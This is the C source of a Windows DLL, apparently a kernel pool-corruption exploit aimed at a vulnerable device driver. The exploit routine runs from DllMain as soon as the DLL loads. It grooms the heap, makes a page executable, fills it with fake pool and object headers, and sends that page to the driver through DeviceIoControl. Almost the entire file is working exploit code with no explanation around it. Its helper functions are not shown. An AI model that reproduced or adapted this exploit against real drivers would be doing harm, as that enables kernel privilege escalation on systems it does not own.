#include "exploit_dll.h"

char unused = 0, output[1024];
HANDLE h_driver = (HANDLE)-1;
void* heaps[HEAP_OBJECT_COUNT];
char* fake_pool_memory_page = (void*)0;
unsigned long bytes_returned = 0L, old_protection = 0L;

POOL_HEADER pool_header;
OBJECT_HEADER_QUOTA object_header_quota;
EX_PUSH_LOCK ex_push_lock;
QUAD quad;
OBJECT_HEADER object_header;

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        exploit_pool();
        break;
    }

    return TRUE;
}

void exploit_pool()
{
    RtlSecureZeroMemory(heaps, sizeof(heaps));
    RtlSecureZeroMemory(&pool_header, sizeof(pool_header));
    RtlSecureZeroMemory(&object_header_quota, sizeof(object_header_quota));
    RtlSecureZeroMemory(&ex_push_lock, sizeof(ex_push_lock));
    RtlSecureZeroMemory(&quad, sizeof(quad));
    RtlSecureZeroMemory(&object_header, sizeof(object_header));
    RtlSecureZeroMemory(&output, sizeof(output));

    h_driver = CreateFileA(DEVICE, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
    if (h_driver == (HANDLE)-1)
    {
        return;
    }

    for (int i = 0; i < HEAP_OBJECT_COUNT; i++)
    {
        heaps[i] = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 4096);
    }

    fake_pool_memory_page = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 4096);
    if (!fake_pool_memory_page)
    {
        return ;
    }

    if (!VirtualProtect(fake_pool_memory_page, 4096, PAGE_EXECUTE_READWRITE, &old_protection))
    {
        return;
    }

    for (int i = 0; i < HEAP_OBJECT_COUNT; i++)
    {
        HeapFree(GetProcessHeap(), 0, heaps[i]);
    }

    initialize_pool_structs(fake_pool_memory_page, &pool_header, &object_header_quota, &ex_push_lock, &quad, &object_header);
    build_pool_chunk(fake_pool_memory_page, pool_header, object_header_quota, object_header);

    Sleep(1000);
    // __asm int 3

    DeviceIoControl(h_driver, TARGET_IOCTL, &fake_pool_memory_page, 4, &output, sizeof(output), &bytes_returned, 0);

    return;
}